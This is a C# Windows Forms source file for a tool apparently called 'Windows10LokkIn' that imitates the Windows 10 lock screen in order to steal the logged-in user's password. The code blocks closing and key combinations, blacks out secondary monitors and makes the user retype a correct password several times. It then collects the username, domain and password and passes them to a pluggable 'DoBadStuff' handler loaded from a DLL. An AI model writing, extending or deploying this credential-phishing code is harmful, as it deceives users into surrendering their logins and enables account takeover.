using Windows10LokkIn.Classes;
using Windows10LokkIn.Controls;
using Windows10LokkIn.Interfaces;
using Windows10LokkIn.Models;
using System;
using System.Collections.Generic;
using System.Data;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows10LokkIn
{
    public partial class WindowsLogin : Form
    {
        #region "Variables and Stuff"

        // Decides wether the form can be closed or not
        private bool DenyClose { get; set; }
        private IDoBadStuff DoBadStuff;
        private Language Language { get; set; }
        private Configuration Configuration { get; set; } = new Configuration();

        private int PasswordErrors { get; set; }
        private int PasswordErrorCounter { get; set; }
        private Result Result { get; set; } = new Result();

        #endregion

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        // Gets called when main login form would be closing
        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!Configuration.DebugMode) e.Cancel = DenyClose;
        }

        // Dont't know what this does
        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        #endregion

        #region "Events"

        // Gets called when the Login Button is clicked or the enter key event is triggered on the password text box
        private void LoginButton_Click(object sender, EventArgs e)
        {
            // Do nothing if no password has been entered
            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
            if (PasswordTextBox.Text == Language.PlaceholderText) return;

            if (PasswordErrorCounter < PasswordErrors)
            {
                PasswordErrorCounter++;
                Result.WrongPasswords.Add(PasswordTextBox.Text);
                ShowPasswordError();
                return;
            }

            DenyClose = false;

            if (!Configuration.DebugMode) KeyPressHandler.Enable();

            try
            {
                Result.UserName = Environment.UserName;
                Result.DisplayName = UserNameLabel.Text;
                Result.DomainName = Environment.UserDomainName;
                Result.Password = PasswordTextBox.Text;

                // Time for malicious business 😏
                DoBadStuff.Now(Result);
            }
            catch (Exception ex)
            {
                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                Close();
            }

        }

        private void ShowPasswordError()
        {
            SetPlaceholder();
            ChangeVisiblityOfPasswordControls(true);
        }

        private void WrongPasswordButton_Click(object sender, EventArgs e)
        {
            ChangeVisiblityOfPasswordControls(false);
            PasswordTextBox.Focus();
        }

        private void ChangeVisiblityOfPasswordControls(bool wrongPassword)
        {
            PasswordTextBox.Visible = !wrongPassword;
            ShowPasswordButton.Visible = !wrongPassword;
            LoginButton.Visible = !wrongPassword;
            CapsLockLabel.Visible = !wrongPassword && IsKeyLocked(Keys.CapsLock);

            WrongPasswordLabel.Visible = wrongPassword;
            WrongPasswordButton.Visible = wrongPassword;
            if (wrongPassword) WrongPasswordButton.Focus();

            Refresh();
        }

        private void LanguageButton_Click(object sender, EventArgs e)
        {
            try
            {
                Controls.Find("languagePanel", true).FirstOrDefault().Visible = !Controls.Find("languagePanel", true).FirstOrDefault().Visible;
            }
            catch { }
        }

        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 1;

            // draw a border around the password text box
            if (PasswordTextBox.Visible)
            {
                e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                    PasswordTextBox.Location.X - offset,
                    PasswordTextBox.Location.Y - offset,
                    PasswordTextBox.Width + offset,
                    PasswordTextBox.Height + offset));
            }

            // draw top and bottom border of show password button
            if (ShowPasswordButton.Visible)
            {
                e.Graphics.DrawLine(new Pen(LoginButton.FlatAppearance.BorderColor),
                    ShowPasswordButton.Location.X - offset, ShowPasswordButton.Location.Y - offset,
                    ShowPasswordButton.Location.X - offset + ShowPasswordButton.Width, ShowPasswordButton.Location.Y - offset);

                e.Graphics.DrawLine(new Pen(LoginButton.FlatAppearance.BorderColor),
                  ShowPasswordButton.Location.X, ShowPasswordButton.Location.Y + ShowPasswordButton.Height,
                  ShowPasswordButton.Location.X + ShowPasswordButton.Width, ShowPasswordButton.Location.Y + ShowPasswordButton.Height);
            }

        }

        private void LanguageClick(object sender, EventArgs e)
        {
            Controls.Find("languagePanel", true).FirstOrDefault().Visible = false;
        }

        #endregion

        #region "Password"

        // Show password when button is pressed
        private void ShowPasswordButton_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text != Language.PlaceholderText)
                PasswordTextBox.UseSystemPasswordChar = !PasswordTextBox.UseSystemPasswordChar;
        }

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            // Show caps lock warning
            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);

            // send password
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();

            // WinForms doesn't have *real* placeholders, so we have to tinker around
            // to make it seem like a real placeholder.
            // this prevents moving the text cursor
            if (PasswordTextBox.Text == Language.PlaceholderText)
            {
                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                {
                    PasswordTextBox.Select(0, 0);
                    e.Handled = true;
                }
            }
        }

        // decide wether to show the placeholder or not
        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;

            if (string.IsNullOrEmpty(tb.Text))
            {
                SetPlaceholder();
            }

            if (tb.Text.Substring(1, tb.Text.Length - 1) == Language.PlaceholderText)
            {
                tb.UseSystemPasswordChar = true;
                tb.Text = tb.Text.Substring(0, 1);
                tb.ForeColor = Color.Black;
                tb.Select(1, 0);

                ShowPasswordButton.Visible = true;
                PasswordTextBox.Width -= ShowPasswordButton.Width;
            }
        }

        // WinForms doesn't have *real* placeholders, so we have to tinker around
        // to make it seem like a real placeholder.
        // this prevents placing the text cursor somewhere where it shouldn't be
        private void PasswordTextBox_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == Language.PlaceholderText) PasswordTextBox.Select(0, 0);
        }

        // Put placeholder text into password textbox
        private void SetPlaceholder()
        {
            PasswordTextBox.UseSystemPasswordChar = false;
            PasswordTextBox.Text = Language.PlaceholderText;
            PasswordTextBox.ForeColor = LoginButton.FlatAppearance.BorderColor;
            PasswordTextBox.Select(0, 0);

            ShowPasswordButton.Visible = false;
            PasswordTextBox.Width += ShowPasswordButton.Width;
        }

        #endregion

        #region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            // Blur background image after everything has been loaded
            BlurBackground();
        }

        // Handle all setup
        private void Initialize()
        {
            InitializeConfiguration();
            InitializeLanguage();
            InitializeMisc();
            InitializePasswordTextbox();
            InitializeKeyCombinations();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
            InitializeOtherUsers();
            InitializePasswordErrors();
        }

        // Loads all languages
        private void InitializeLanguage()
        {
            List<ILanguage> languages = new List<ILanguage>();

            try
            {
                languages = InterfaceLoader.GetAll<ILanguage>();
                ILanguage language = languages.FirstOrDefault(x => x.Identifier == Configuration.DefaultLanguage);
                if (language is null) throw new Exception("Could not find languages");

                Language = new Language(language.Identifier);
                language.Apply(Language);
            }
            catch
            {
                EnglishLanguage l = new EnglishLanguage();
                Language = new Language(l.Identifier);
                l.Apply(Language);
            }

            CapsLockLabel.Text = Language.CapsLockText;
            WrongPasswordLabel.Text = Language.WrongPasswordText;

            LanguageButton.Text = Language.LanguageCode.ToUpper();

            Controls.Add(ControlFactory.CreateLanguagePanel("languagePanel", languages, LanguageButton.Location.X + LanguageButton.Width, LanguageButton.Location.Y, Language));
            Controls.Find("languagePanel", true).FirstOrDefault().Visible = false;

            foreach (ILanguage language in languages)
            {
                Controls.Find(language.Identifier + "1", true).FirstOrDefault().Click += LanguageClick;
                Controls.Find(language.Identifier + "2", true).FirstOrDefault().Click += LanguageClick;
            }
        }

        // Loads a setup from a dll file thats implements the ISetup interface
        private void InitializeConfiguration()
        {

            try
            {
                ISetup setup = InterfaceLoader.Get<ISetup>();
                if (setup is null) throw new Exception("Could not find external configuration");

                setup.Initialize(Configuration);
            }
            catch
            {
                Configuration = new Configuration();
            }

        }

        private void InitializeMisc()
        {
            // disallow closing of the program
            DenyClose = true;
            // display CapsLock notification if necessary
            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);

            ChangeVisiblityOfPasswordControls(false);

            TopMost = !Configuration.DebugMode;
        }

        // Show placeholder on startup
        private void InitializePasswordTextbox()
        {
            SetPlaceholder();
        }

        // Check wether a .dll file implementing IDoBadStuff is available
        // if its available, it replaces the default bad stuff object
        private void InitializeBadStuff()
        {
            try
            {
                DoBadStuff = InterfaceLoader.Get<IDoBadStuff>(true);

                if (DoBadStuff is null) DoBadStuff = new DefaultBadStuff();
            }
            catch (Exception ex)
            {
                DoBadStuff = new DefaultBadStuff();
                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        // disables certain key combinations in release builds
        private void InitializeKeyCombinations()
        {
            if (!Configuration.DebugMode) KeyPressHandler.Disable();
        }

        // Display the users Username on the form
        private void InitializeUserLabel()
        {
            try
            {
                if (Configuration.UseUserPrincipal)
                {
                    DateTime startTime = DateTime.Now;

                    Task t = new Task(() =>
                    {
                        UserNameLabel.Text = UserPrincipal.Current.DisplayName;
                    });

                    t.Start();

                    while (true)
                    {
                        if (startTime.AddSeconds(Configuration.UserPrincipalTimeout) > DateTime.Now) continue;
                        else if (!t.IsCompleted) throw new Exception("timeout");
                        else if (t.IsCompleted) break;
                    }

                }
                else
                {
                    UserNameLabel.Text = Environment.UserName;
                }
            }
            catch
            {
                UserNameLabel.Text = Environment.UserName;
            }
        }

        // Load the users wallpaper
        private Bitmap GetBackgroundImage()
        {
            return new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
        }

        // Set the users wallpaper as the form background
        private void InitializeBackground()
        {
            BackgroundImage = GetBackgroundImage();
        }

        // blur the users wallpaper and set it as the form background
        private void BlurBackground()
        {
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(Configuration.BlurIntensity);

            if (BackgroundImage.IsPixelBright(11, 387) || //Bottom left
                BackgroundImage.IsPixelBright(EaseOfAccessButton.Location.X, EaseOfAccessButton.Location.Y) ||
                BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(Configuration.DarknessIntensity);
        }

        // Load the current users profile picture into the form
        private void InitializeUserIcon()
        {
            UserIconPictureBox.Image = GetUserIconByName(Environment.UserName);
        }

        // Get a users profile picture from a directory
        private Image GetUserIconFromPath(string fileEnding, string path)
        {
            try
            {
                foreach (string f in Directory.GetFiles(path))
                {
                    if (!f.EndsWith($".{fileEnding}")) continue;
                    if (!Path.GetFileName(f).Contains(Environment.UserName)) continue;
                    return Image.FromFile(f);
                }

                return null;
            }
            catch
            {
                return Properties.Resources.defaultAvatar;
            }
        }

        // Load the users avatar by knowing his user name
        private Image GetUserIconByName(string username)
        {
            Image img = null;

            string path = Path.GetTempPath();

            // if no username is given or "other user" is selected (think domain account), load default avatar
            if (string.IsNullOrEmpty(username) || username == Language.OtherUserText)
                img = Properties.Resources.defaultAvatar;

            // Check for user avatar with multiple file extensions
            if (img is null)
                img = GetUserIconFromPath("bmp", path);

            if (img is null)
                img = GetUserIconFromPath("png", path);

            if (img is null)
                img = GetUserIconFromPath("jpg", path);

            if (img is null)
                img = Properties.Resources.defaultAvatar;

            return img;
        }

        // black out all non-primary screens
        private void InitializeOtherScreens()
        {
            if (!Configuration.DebugMode)
            {
                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
                {
                    new Task(() => BlackScreen(screen)).Start();
                }
            }
        }

        // Create a fullscreen black form
        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black,
                TopMost = true
            };

            blackForm.FormClosing += WindowsLogin_FormClosing;

            blackForm.ShowDialog();
        }

        // add other users buttons and display them in the lower left corner
        private void InitializeOtherUsers()
        {
            AddChangeUserPanel(Language.OtherUserText, 0, GetUserIconByName(Language.OtherUserText));
            AddChangeUserPanel(UserNameLabel.Text, 1, GetUserIconByName(Environment.UserName));

            int counter = 0;
            // add emergency exit to user button
            ((Button)Controls.Find("1", true).First()).Click += (s, e) =>
            {
                counter++;

                if (counter > 50)
                {
                    DenyClose = false;
                    if (!Configuration.DebugMode) KeyPressHandler.Enable();
                    Close();
                }

            };
        }

        // create a "other user" control with given properties, then place it on screen
        private void AddChangeUserPanel(string user, int panelCount, Image userIcon)
        {
            Controls.Add(ControlFactory.CreateUserPanel(user, panelCount, UserNameLabel.Text, userIcon));
        }

        // sets the amount of needed password tries
        private void InitializePasswordErrors()
        {
            PasswordErrors = new Random().Next(Configuration.MinPasswordErrors, Configuration.MaxPasswordErrors + 1);
            PasswordErrorCounter = 0;
        }

    }

    #endregion

}
